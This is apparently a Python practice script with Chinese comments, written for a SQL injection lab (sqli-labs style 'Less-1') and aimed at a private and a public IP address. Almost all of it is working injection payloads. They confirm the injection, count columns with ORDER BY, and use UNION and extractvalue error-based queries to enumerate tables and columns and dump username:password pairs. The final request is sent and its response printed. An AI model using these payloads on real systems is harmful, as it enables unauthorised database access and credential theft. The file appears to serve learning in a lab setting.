# -*- coding:utf8 -*- #
# -----------------------------------------------------------------------------------
# ProjectName:   Jakiro_pro
# FileName:     sql_union.py
# Author:      Jakiro
# Datetime:    2022/2/22 09:36
# Description:
# 命名规则  文件名小写字母+下划线，类名大驼峰，方法、变量名小写字母+下划线连接
# 常量大写，变量和常量用名词、方法用动词
# -----------------------------------------------------------------------------------


import requests

ses = requests.session()
base_url = r'http://10.10.30.171:23186/Less-1/'
base_url = 'http://47.103.94.191:8005//bug/sql_injection/sql_string.php?title=2&submit=submit'
#
# SQL源码
# sql = 'SELECT * FROM users WHERE id='1' or 1=2 --+' LIMIT 0,1'
url_1 = base_url + '?id=1'
# 判断是否可以被注入
url_2 = base_url + '?id=1\' and 1=1 --+'
url_3 = base_url + '?id=1\' and 1=2 --+'

# 判断原始sql的查询结果有几列 有几个字段 order by 3 用第几列来排序，猜测一个数字，逐渐递减，直到不报错
# 判断返回字段有5列 报错
url_4 = base_url + '?id=1\' order by 5 --+'
# 判断返回字段有3列 不报错  判断返回字段有3列
url_5 = base_url + '?id=1\' order by 3 --+'

# 手工UNION联合查询注入
# http://sqlwiki.radare.cn/#/attackQueries/informationGathering 常见的数据库信息
# 使用联合查询 联合查询前面一个查询的结果需要和后一列的结果字段数相同 union前面的查询不出来 就能回显后一条的结果
# 此处查询出用户以及数据库名
url_6 = base_url + '?id=-1\' union select 1,user(),database() --+'
# url_7 = base_url+'?id=-1\' union select 1, @@version,database() --+'
# http://10.10.30.171:23186/Less-1/?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+

# 通过数据库固件查询出数据库中的所有表名group_concat 将查询出来的所有字段连接成一个字段
url_7 = base_url + '?id=-1\' union select 1,2,group_concat(table_name) FROM information_schema.' \
                   'tables where table_schema=database() --+'

# 通过表名查询出 表中的字段名
url_8 = base_url + '?id=-1\' union select 1,2,group_concat(column_name) from information_schema.columns where table_name = "users" --+'

# 通过字段名 查询表中的字段内容
# 0x3a： 0x是十六进制标志，3a是十进制的58，是ascii中的 ':' ，用以分割pasword和username。
url_9 = base_url + '?id=-1\' union select 1,2,group_concat(username,0x3a,password) from users --+'

# 方法二：手工报错型注入
#  爆表
url_10 = base_url + '?id=1\' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) --+'

# 爆字段名
url_11 = base_url + '?id=1\' and extractvalue(1,concat(0x73,(select group_concat(column_name) from information_schema.columns where table_name="users"  ))) --+'

# 爆其他字段
url_12 = base_url + '?id=1\' and extractvalue(1,concat(0x73,(select group_concat(column_name) from information_schema.columns where table_name="users" and column_name not in ("username","password") ))) --+'

# 爆值
url_13 = base_url + '?id=1\' and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users where username not in("Dumb","Angelina","Dummy","secure","stupid","superman","batman","admin","admin1","admin2")))) --+'
res = ses.get(url=url_13)

print(res.text)
